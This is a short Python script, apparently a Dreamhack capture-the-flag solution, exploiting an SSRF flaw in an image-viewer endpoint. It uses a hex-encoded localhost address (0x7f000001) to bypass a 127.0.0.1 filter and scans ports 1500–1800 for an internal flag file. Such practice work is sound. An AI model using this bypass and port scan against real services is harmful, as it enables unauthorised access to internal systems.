import requests



"""
SSRF 취약점

url 파라미터에 무엇을 넣을 것인가? 
>> 포트, /app/flag.txt
127.0.0.1 어떻게 우회해 내부로 침투?
"""
URL = 'http://host3.dreamhack.games:15490/img_viewer'
PORT = 1500
for i in range(PORT, 1801):
    payloads = {"url": f"http://0x7f000001:{i}/flag.txt"}
    resp = requests.post(URL, data=payloads)
    data = resp.headers['content-length']
    if data not in "65121":
        print(f"port is {i}, length is {data}")
        break
    else:
        print(f"Fail, port is {i}")